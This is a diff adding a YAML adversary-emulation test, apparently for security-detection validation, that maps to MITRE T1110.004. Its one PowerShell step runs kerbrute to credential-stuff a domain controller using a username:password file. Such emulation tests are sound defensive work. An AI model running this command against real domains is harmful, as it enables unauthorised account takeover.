@@ -1,0 +1,29 @@
+api_version: "2.0"
+name: Brute Force:Credential Stuffing using Kerbrute Tool
+description: |
+    Will read username and password combos from a file or stdin (format username:password) and perform a bruteforce attack
+args:
+    - name: domaincontroller
+      type: string
+      default: $ENV:userdnsdomain
+    - name: domain
+      type: string
+      default: $ENV:userdomain
+uuid: 4852c630-87a9-409b-bb5e-5dc12c9ebcde
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1110: Brute Force'
+    subtechniques:
+        - 'T1110.004: Credential Stuffing'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: brute-force:credential-stuffing-using-kerbrute-tool
+      inline: "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe bruteforce --dc {{.Args.domaincontroller}} -d {{.Args.domain}} \"PathToAtomicsFolder\\..\\ExternalPayloads\\bruteforce.txt\"      \n"
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
